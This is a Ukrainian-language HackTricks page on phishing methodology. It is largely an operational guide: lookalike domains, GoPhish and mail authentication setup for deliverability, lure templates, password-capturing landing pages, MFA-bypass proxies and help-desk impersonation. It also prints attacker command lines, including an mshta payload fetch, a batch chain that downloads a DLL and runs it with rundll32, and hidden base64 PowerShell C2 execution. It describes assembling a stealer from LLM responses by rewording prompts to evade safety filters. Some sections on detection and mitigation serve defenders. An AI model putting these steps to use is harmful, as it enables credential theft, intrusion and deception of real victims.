# Методологія фішингу

{{#include ../../banners/hacktricks-training.md}}

## Методологія

1. Провести розвідку жертви
1. Вибрати **домен жертви**.
2. Виконати базове перерахування вебресурсів, **шукаючи портали входу**, які використовує жертва, і **вирішити**, який із них ви будете **імітувати**.
3. Використати **OSINT**, щоб **знайти адреси електронної пошти**.
2. Підготувати середовище
1. **Придбати домен**, який ви будете використовувати для фішингової оцінки
2. **Налаштувати пов’язані із сервісом електронної пошти записи** (SPF, DMARC, DKIM, rDNS)
3. Налаштувати VPS із **gophish**
3. Підготувати кампанію
1. Підготувати **шаблон електронного листа**
2. Підготувати **вебсторінку** для викрадення облікових даних
4. Запустити кампанію!

## Генерація схожих доменних імен або придбання надійного домену

### Методи варіації доменних імен

- **Ключове слово**: доменне ім’я **містить** важливе **ключове слово** оригінального домену (наприклад, zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Дефіс у піддомені**: Замінити **крапку на дефіс** у піддомені (наприклад, www-zelster.com).
- **Новий TLD**: Той самий домен із використанням **нового TLD** (наприклад, zelster.org)
- **Homoglyph**: **Замінити** літеру в доменному імені на **літери, що мають схожий вигляд** (наприклад, zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Транспозиція:** **Поміняти місцями дві літери** в доменному імені (наприклад, zelsetr.com).
- **Перетворення на однину/множину**: Додати або видалити «s» у кінці доменного імені (наприклад, zeltsers.com).
- **Пропуск**: **Видалити одну** з літер доменного імені (наприклад, zelser.com).
- **Повторення:** **Повторити одну** з літер доменного імені (наприклад, zeltsser.com).
- **Заміна**: Подібно до homoglyph, але менш непомітно. Замінити одну з літер доменного імені, можливо, на літеру, розташовану поруч з оригінальною на клавіатурі (наприклад, zektser.com).
- **Піддомен**: Додати **крапку** всередині доменного імені (наприклад, ze.lster.com).
- **Вставка**: **Вставити літеру** в доменне ім’я (наприклад, zerltser.com).
- **Відсутня крапка**: Додати TLD до доменного імені (наприклад, zelstercom.com)

**Автоматичні інструменти**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Вебсайти**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Існує **ймовірність, що деякі біти, які зберігаються або передаються, можуть автоматично змінитися** через різні фактори, як-от сонячні спалахи, космічні промені або апаратні помилки.

Коли цю концепцію **застосовують до DNS-запитів**, можливо, що **домен, отриманий DNS-сервером**, не збігається з доменом, який спочатку запитували.

Наприклад, зміна одного біта в домені «windows.com» може перетворити його на «windnws.com».

Зловмисники можуть **скористатися цим, зареєструвавши кілька доменів із перевертанням бітів**, схожих на домен жертви. Їхня мета — перенаправити легітимних користувачів на власну інфраструктуру.

Докладніше дивіться [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Придбання надійного домену

Ви можете пошукати на [https://www.expireddomains.net/](https://www.expireddomains.net) прострочений домен, який можна використати.\
Щоб переконатися, що прострочений домен, який ви збираєтеся придбати, **вже має хороші SEO-показники**, можна перевірити, як його класифіковано в:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Виявлення адрес електронної пошти

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% безкоштовно)
- [https://phonebook.cz/](https://phonebook.cz) (100% безкоштовно)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Щоб **виявити більше** дійсних адрес електронної пошти або **перевірити ті, які** ви вже виявили, можна перевірити, чи вдасться перебирати їх на SMTP-серверах жертви. [Дізнайтеся тут, як перевіряти/виявляти адреси електронної пошти](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Крім того, не забувайте: якщо користувачі використовують **будь-який вебпортал для доступу до своєї пошти**, можна перевірити, чи вразливий він до **username brute force**, і за можливості скористатися цією вразливістю.

## Налаштування GoPhish

### Встановлення

Завантажити його можна з [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Завантажте та розархівуйте його в `/opt/gophish`, а потім виконайте `/opt/gophish/gophish`\
У виводі буде надано пароль для користувача-адміністратора на порту 3333. Тому підключіться до цього порту й використайте ці облікові дані, щоб змінити пароль адміністратора. Можливо, вам знадобиться тунелювати цей порт на локальний:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Налаштування

**Налаштування TLS-сертифіката**

Перед цим кроком ви вже повинні **придбати домен**, який збираєтеся використовувати, і він має **спрямовуватися** на **IP-адресу VPS**, де ви налаштовуєте **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Конфігурація пошти**

Почніть установлення: `apt-get install postfix`

Потім додайте домен до таких файлів:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Також змініть значення таких змінних у /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Зрештою, змініть файли **`/etc/hostname`** і **`/etc/mailname`**, указавши ім’я вашого домену, і **перезапустіть VPS.**

Тепер створіть **DNS A record** для `mail.<domain>`, що вказуватиме на **IP-адресу** VPS, і **DNS MX** record, що вказуватиме на `mail.<domain>`.

Тепер перевірмо надсилання електронного листа:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Конфігурація Gophish**

Зупиніть виконання Gophish і налаштуйте його.\
Змініть `/opt/gophish/config.json` на наведене нижче (зверніть увагу на використання https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Налаштування сервісу gophish**

Щоб створити сервіс gophish, аби його можна було автоматично запускати та керувати ним як сервісом, створіть файл `/etc/init.d/gophish` із таким вмістом:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Завершіть налаштування служби та перевірте її, виконавши:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Налаштування поштового сервера та домену

### Зачекайте та дійте легітимно

Чим старший домен, тим менша ймовірність, що його буде позначено як spam. Тому перед phishing assessment слід зачекати якомога довше (щонайменше 1 тиждень). Крім того, якщо розмістити сторінку про сектор із хорошою репутацією, отримана репутація буде кращою.

Зверніть увагу, що навіть якщо доведеться чекати тиждень, ви можете завершити налаштування всього зараз.

### Налаштування запису Reverse DNS (rDNS)

Налаштуйте запис rDNS (PTR), який зіставляє IP-адресу VPS з доменним ім’ям.

### Запис Sender Policy Framework (SPF)

Ви повинні **налаштувати запис SPF для нового домену**. Якщо ви не знаєте, що таке запис SPF, [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Ви можете скористатися [https://www.spfwizard.net/](https://www.spfwizard.net), щоб згенерувати політику SPF (використайте IP-адресу VPS)

![Форма SPF Wizard для генерації запису SPF для phishing-домену](<../../images/image (1037).png>)

Це вміст, який потрібно встановити в TXT-записі домену:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Запис Domain-based Message Authentication, Reporting & Conformance (DMARC)

Ви повинні **налаштувати запис DMARC для нового домену**. Якщо ви не знаєте, що таке запис DMARC, [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Вам потрібно створити новий запис DNS TXT, що вказує на ім'я хоста `_dmarc.<domain>`, із таким вмістом:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Ви повинні **налаштувати DKIM для нового домену**. Якщо ви не знаєте, що таке запис DKIM, [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Цей посібник базується на: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Вам потрібно об'єднати обидва значення B64, які генерує ключ DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Перевірка оцінки конфігурації електронної пошти

Ви можете зробити це за допомогою [https://www.mail-tester.com/](https://www.mail-tester.com)\
Просто відкрийте сторінку та надішліть електронний лист на вказану ними адресу:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Ви також можете **перевірити конфігурацію електронної пошти**, надіславши листа на `check-auth@verifier.port25.com` і **прочитавши відповідь** (для цього потрібно буде **відкрити** порт **25** і переглянути відповідь у файлі _/var/mail/root_, якщо ви надсилаєте листа від імені root).\
Переконайтеся, що ви проходите всі тести:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Ви також можете надіслати **повідомлення до Gmail під вашим контролем** і перевірити **заголовки електронного листа** у вхідних повідомленнях Gmail; у полі заголовка `Authentication-Results` має бути присутнє `dkim=pass`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Видалення з чорного списку Spamhaus

Сторінка [www.mail-tester.com](https://www.mail-tester.com) може повідомити, чи заблоковано ваш домен Spamhaus. Ви можете запросити видалення свого домену/IP-адреси за адресою: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Видалення з чорного списку Microsoft

​​Ви можете запросити видалення свого домену/IP-адреси за адресою [https://sender.office.com/](https://sender.office.com).

## Створення та запуск кампанії GoPhish

### Профіль відправника

- Вкажіть **назву для ідентифікації** профілю відправника
- Вирішіть, з якого облікового запису ви надсилатимете phishing-листи. Варіанти: _noreply, support, servicedesk, salesforce..._
- Ви можете залишити поля імені користувача та пароля порожніми, але обов'язково встановіть прапорець Ignore Certificate Errors

![Створення та запуск кампанії GoPhish — профіль відправника: ви можете залишити поля імені користувача та пароля порожніми, але обов'язково встановіть прапорець Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Рекомендується використовувати функцію "**Send Test Email**", щоб перевірити, чи все працює.\
> Я рекомендую **надсилати тестові листи на адреси 10min mail**, щоб уникнути потрапляння до чорного списку під час тестування.

### Шаблон електронного листа

- Вкажіть **назву для ідентифікації** шаблону
- Потім напишіть **тему** (нічого незвичайного — просто щось, що ви очікували б побачити у звичайному електронному листі)
- Переконайтеся, що встановлено прапорець "**Add Tracking Image**"
- Напишіть **шаблон електронного листа** (можна використовувати змінні, як у наведеному нижче прикладі):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Зверніть увагу, що **для підвищення достовірності електронного листа** рекомендується використати підпис із листа клієнта. Варіанти:

- Надішліть лист на **неіснуючу адресу** та перевірте, чи містить відповідь підпис.
- Знайдіть **публічні адреси** на кшталт info@ex.com, press@ex.com або public@ex.com, надішліть їм листа та дочекайтеся відповіді.
- Спробуйте зв’язатися з **якоюсь дійсною знайденою** адресою та дочекайтеся відповіді.

![Sending Profile - Email Template: Спробуйте зв’язатися з якоюсь дійсною знайденою адресою та дочекайтеся відповіді](<../../images/image (80).png>)

> [!TIP]
> Email Template також дозволяє **додавати файли для надсилання**. Якщо ви також хочете викрасти NTLM challenges за допомогою спеціально створених файлів/документів, [прочитайте цю сторінку](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Вкажіть **назву**
- **Напишіть HTML-код** вебсторінки. Зверніть увагу, що ви можете **імпортувати** вебсторінки.
- Позначте **Capture Submitted Data** та **Capture Passwords**
- Налаштуйте **перенаправлення**

![Email Template - Landing Page: Позначте Capture Submitted Data та Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Зазвичай потрібно змінити HTML-код сторінки та провести кілька локальних тестів (можливо, використовуючи Apache server), **доки результат вас не задовольнить.** Потім вставте цей HTML-код у поле.\
> Зверніть увагу: якщо для HTML потрібно **використовувати статичні ресурси** (наприклад, деякі CSS- і JS-сторінки), їх можна зберегти в _**/opt/gophish/static/endpoint**_, а потім отримувати до них доступ через _**/static/\<filename>**_

> [!TIP]
> Для перенаправлення можна **перенаправити користувачів на легітимну головну вебсторінку** жертви або, наприклад, перенаправити їх на _/static/migration.html_, додати **індикатор завантаження (**[**https://loading.io/**](https://loading.io)**) на 5 секунд, а потім повідомити, що процес завершено успішно**.

### Users & Groups

- Вкажіть назву
- **Імпортуйте дані** (зверніть увагу, що для використання шаблону з прикладу потрібні ім’я, прізвище та адреса електронної пошти кожного користувача)

![Landing Page - Users & Groups: Імпортуйте дані (зверніть увагу, що для використання шаблону з прикладу потрібні ім’я, прізвище та адреса електронної пошти кожного користувача)](<../../images/image (163).png>)

### Campaign

Нарешті, створіть кампанію, вибравши назву, email template, landing page, URL, sending profile та group. Зверніть увагу, що URL буде посиланням, надісланим жертвам.

Зверніть увагу, що **Sending Profile дозволяє надіслати тестовий лист, щоб перевірити, як виглядатиме фінальний phishing email**:

![Users & Groups - Campaign: Зверніть увагу, що Sending Profile дозволяє надіслати тестовий лист, щоб перевірити, як виглядатиме фінальний phishing email](<../../images/image (192).png>)

Коли все буде готово, просто запустіть кампанію!

## Website Cloning

Якщо з будь-якої причини ви хочете клонувати вебсайт, перегляньте цю сторінку:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Під час деяких phishing assessments (переважно для Red Teams) ви також можете захотіти **надсилати файли, що містять певний backdoor** (можливо, C2 або просто щось, що ініціює authentication).\
Перегляньте наведену нижче сторінку з прикладами:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Попередня атака є досить хитрою, оскільки ви імітуєте справжній вебсайт і збираєте інформацію, введену користувачем. На жаль, якщо користувач ввів неправильний пароль або якщо підроблений вами застосунок налаштований із 2FA, **ця інформація не дозволить вам видати себе за обманутого користувача**.

Саме тут корисні такі інструменти, як [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) і [**muraena**](https://github.com/muraenateam/muraena). Цей інструмент дозволяє створити атаку на кшталт MitM. Загалом атака працює так:

1. Ви **імітуєте форму входу** справжньої вебсторінки.
2. Користувач **надсилає** свої **credentials** на вашу підроблену сторінку, а інструмент надсилає їх на справжню вебсторінку, **перевіряючи, чи працюють credentials**.
3. Якщо обліковий запис налаштований із **2FA**, MitM-сторінка попросить ввести його, а після того, як **користувач введе** його, інструмент надішле його на справжню вебсторінку.
4. Після автентифікації користувача ви (як attacker) матимете **перехоплені credentials, 2FA, cookie та будь-яку інформацію** з усіх взаємодій під час виконання інструментом MitM.

### Via VNC

Що, якби замість **надсилання жертви на шкідливу сторінку** з таким самим виглядом, як оригінальна, ви перенаправили її до **VNC-сеансу з browser, підключеним до справжньої вебсторінки**? Ви зможете бачити, що вона робить, викрасти пароль, використаний MFA, cookies...\
Це можна зробити за допомогою [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Detecting the detection

Очевидно, один із найкращих способів дізнатися, чи вас викрили, — **перевірити свій домен у blacklists**. Якщо він там є, це означає, що ваш домен певним чином виявили як підозрілий.\
Один із простих способів перевірити, чи є ваш домен у будь-якому blacklist, — скористатися [https://malwareworld.com/](https://malwareworld.com)

Однак є й інші способи дізнатися, чи жертва **активно шукає підозрілу phishing activity у мережі**, як пояснюється тут:


{{#ref}}
detecting-phising.md
{{#endref}}

Ви можете **придбати домен із дуже схожою назвою** на домен жертви **та/або створити certificate** для **subdomain** домену, який контролюєте, **що містить** **keyword** домену жертви. Якщо **жертва** виконає будь-яку **DNS- або HTTP-взаємодію** з ними, ви дізнаєтеся, що вона **активно шукає** підозрілі домени, і вам потрібно буде діяти дуже непомітно.<sup>[[2]](#references)</sup>

### Evaluate the phishing

Використовуйте [**Phishious** ](https://github.com/Rices/Phishious), щоб перевірити, чи потрапить ваш email до spam folder, чи його буде заблоковано або доставлено успішно.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Сучасні intrusion sets дедалі частіше повністю відмовляються від email lures і **безпосередньо атакують workflow service-desk / identity-recovery**, щоб обійти MFA. Атака повністю використовує підхід "living-off-the-land": щойно operator отримує дійсні credentials, він переміщується за допомогою вбудованих admin tooling — malware не потрібен.<sup>[[6]](#references)</sup>

### Attack flow
1. Проведіть recon жертви
* Зберіть особисті й корпоративні відомості з LinkedIn, data breaches, public GitHub тощо.
* Визначте identities високої цінності (керівники, IT, finance) та з’ясуйте **точний help-desk process** для скидання password / MFA.
2. Social engineering у реальному часі
* Зателефонуйте, напишіть у Teams або чаті help-desk, видаючи себе за ціль (часто використовуючи **spoofed caller-ID** або **cloned voice**).
* Надайте попередньо зібрані PII, щоб пройти knowledge-based verification.
* Переконайте агента **скинути MFA secret** або виконати **SIM-swap** для зареєстрованого mobile number.
3. Негайні post-access actions (≤60 min у реальних випадках)
* Отримайте foothold через будь-який web SSO portal.
* Перелічіть AD / AzureAD за допомогою вбудованих засобів (без розгортання binaries):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Виконайте lateral movement за допомогою **WMI**, **PsExec** або легітимних **RMM** agents, уже дозволених у середовищі.

### Detection & Mitigation
* Розглядайте identity recovery через help-desk як **privileged operation** — вимагайте step-up auth і схвалення manager.
* Розгорніть правила **Identity Threat Detection & Response (ITDR)** / **UEBA**, які сповіщають про:
* Зміну MFA method + authentication із нового device / geo.
* Негайне підвищення прав того самого principal (user-→-admin).
* Записуйте help-desk calls і вимагайте **call-back на вже зареєстрований номер** перед будь-яким reset.
* Реалізуйте **Just-In-Time (JIT) / Privileged Access**, щоб щойно скинуті accounts **не успадковували автоматично high-privilege tokens**.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews компенсують вартість high-touch ops масовими атаками, які перетворюють **search engines і ad networks на delivery channel**.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** просуває фальшивий результат, наприклад `chromium-update[.]site`, на перше місце в search ads.
2. Жертва завантажує невеликий **first-stage loader** (часто JS/HTA/ISO). Приклади, помічені Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader викрадає browser cookies + credential DBs, а потім завантажує **silent loader**, який у *реальному часі* вирішує, що розгорнути:
* RAT (наприклад, AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Блокуйте newly-registered domains і застосовуйте **Advanced DNS / URL Filtering** також до *search-ads*, а не лише до email.
* Обмежте встановлення software signed MSI / Store packages, забороніть виконання `HTA`, `ISO`, `VBS` за допомогою policy.
* Відстежуйте дочірні processes browser, які відкривають installers:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Шукайте LOLBins, якими часто зловживають first-stage loaders (наприклад, `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Деякі фальшиві software portals залишають видимий download `href`, що вказує на **справжню URL-адресу GitHub/release**, але перехоплюють **першу** взаємодію користувача за допомогою JavaScript і натомість спрямовують жертву до ланцюжка **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Ключові ознаки:
- Hook зазвичай запускається у **capture phase** (`true`) на `document`, тому спрацьовує до обробників сайту.
- Chrome часто використовує `mousedown` замість `click`, щоб прив'язати redirect до дійсного **user gesture** і покращити обхід блокувальників спливаючих вікон.
- Деякі варіанти заздалегідь відкривають `about:blank` або імітують кліки `<a target="_blank">`, а URL TDS призначають лише пізніше.
- Browser-side caps часто зберігаються в `localStorage`, тому **перший клік** може привести до malware, а після оновлення сторінки або повторних спроб відбувається fallback на безпечне на вигляд visible link.
- TDS може фільтрувати за referrer, доменом входу, GEO, browser/device fingerprint, перевірками VPN/datacenter, контекстом кліку та лічильниками для кожної сесії, через що повторення аналітиком є недетермінованими.

Ідеї для захисту:
- Порівнюйте **відображений** `href` із **фактичною** navigation target, що генерується під час кліку.
- Шукайте обробники `document.addEventListener(..., true)`, які викликають одночасно `preventDefault()` і `stopImmediatePropagation()` разом із `window.open`, `about:blank` або синтетичними кліками anchor.
- Розглядайте кластери нещодавно зареєстрованих software-download доменів, які завантажують один і той самий CloudFront/JS stage, як high-signal SEO-poisoning/TDS pattern.

### ClickFix із fake verification pages + archive-looking LOLBAS fetches
Деякі гілки TDS завершуються fake verification page (у стилі Cloudflare/IUAM), яка вказує жертві запустити trusted Windows binary, наприклад:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Примітки:
- `mshta.exe` виконує **HTA/VBScript на початку відповіді**, навіть якщо URL видає себе за архів `.7z`; додані архівні дані можуть бути лише відволіканням.
- Наступні етапи часто продовжують неправдиво вказувати тип файлу (`.rtf` для PowerShell, `.asar` для Python, ZIP-архіви з доповненими бінарними даними), а потім переходять до **manual PE mapping / in-memory execution**.
- Якщо ви реагуєте на один із таких ланцюжків, збережіть **мережеві дані та дані пам'яті від першого успішного запуску**: подальші повторні відтворення можуть показувати лише нешкідливий шлях інсталятора/SFX або завершуватися помилкою, оскільки видача payload/key була прив'язана до оригінальної TDS-сесії.

### Техніка доставки DLL через ClickFix (підроблене оновлення CERT)
* Принада: клонована рекомендація національного CERT з кнопкою **Update**, яка відображає покрокові інструкції з «виправлення». Жертвам пропонують запустити batch-файл, що завантажує DLL і виконує її через `rundll32`.<sup>[[12]](#references)</sup>
* Типовий ланцюжок batch-файлу:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` записує payload до `%TEMP%`, коротка пауза приховує мережеві затримки, після чого `rundll32` викликає експортовану точку входу (`notepad`).
* DLL надсилає beacon з ідентифікатором хоста та опитує C2 кожні кілька хвилин. Віддалені команди надходять як **base64-кодований PowerShell**, що виконується приховано та з обходом політики:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Це зберігає гнучкість C2 (сервер може замінювати команди без оновлення DLL) і приховує вікна консолі. Шукайте дочірні процеси PowerShell у `rundll32.exe`, які одночасно використовують `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* Захисники можуть шукати HTTP(S)-callback-и у форматі `...page.php?tynor=<COMPUTER>sss<USER>` та інтервали опитування 5 хвилин після завантаження DLL.

---

## Фішингові операції з посиленням AI
Зловмисники тепер об'єднують **LLM та voice-clone API** для повністю персоналізованих приманок і взаємодії в реальному часі.

| Рівень | Приклад використання з боку threat actor |
|-------|-------------|
|Автоматизація|Генерація та надсилання понад 100 тис. email / SMS із рандомізованими формулюваннями та tracking links.|
|Generative AI|Створення *одноразових* email-повідомлень із посиланнями на публічні M&A та внутрішні жарти із соціальних мереж; deep-fake голос CEO у callback scam.|
|Agentic AI|Автономна реєстрація доменів, збирання open-source intel, створення наступних email-повідомлень, коли жертва натискає посилання, але не надсилає облікові дані.|

**Захист:**
• Додавайте **динамічні банери**, що виділяють повідомлення, надіслані ненадійною автоматизацією (через аномалії ARC/DKIM).
• Впроваджуйте **voice-biometric challenge phrases** для телефонних запитів із високим ризиком.
• Постійно імітуйте приманки, створені AI, у програмах підвищення обізнаності — статичні шаблони застаріли.

Див. також — зловживання agentic browsing для крадіжки облікових даних через phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Див. також — зловживання AI agent локальними CLI-інструментами та MCP (для інвентаризації секретів і виявлення):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Runtime-складання фішингового JavaScript за допомогою LLM (генерація коду в браузері)

Зловмисники можуть поширювати HTML, що виглядає нешкідливим, і **генерувати stealer під час виконання**, запитуючи JavaScript у **trusted LLM API**, а потім виконуючи його в браузері (наприклад, через `eval` або динамічний `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** кодуйте URL для exfil/Base64-рядки в prompt; ітеративно змінюйте формулювання, щоб обходити фільтри безпеки та зменшувати кількість hallucinations.
2. **Client-side API call:** під час завантаження JS викликає публічний LLM (Gemini/DeepSeek/etc.) або CDN proxy; у статичному HTML присутні лише prompt/API call.
3. **Assemble & exec:** об'єднуйте відповідь і виконуйте її (поліморфно під час кожного відвідування):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** згенерований code персоналізує lure (наприклад, парсинг токена LogoKit) і надсилає creds на endpoint, прихований у prompt.

**Ознаки ухилення**
- Трафік надходить до добре відомих LLM-доменів або надійних CDN-проксі; іноді через WebSockets до backend.
- Статичний payload відсутній; шкідливий JS існує лише після render.
- Недетерміновані генерації створюють **унікальні stealers для кожної сесії**.

**Ідеї для виявлення**
- Запускайте sandbox із увімкненим JS; виявляйте **runtime `eval`/динамічне створення скриптів, джерелом яких є відповіді LLM**.
- Шукайте front-end POST-запити до LLM API, одразу після яких у тексті, що повернувся, викликаються `eval`/`Function`.
- Створюйте сповіщення про несанкціоновані LLM-домени в клієнтському трафіку з подальшими POST-запитами облікових даних.

---

## MFA Fatigue / Push Bombing Variant – Примусовий скидання
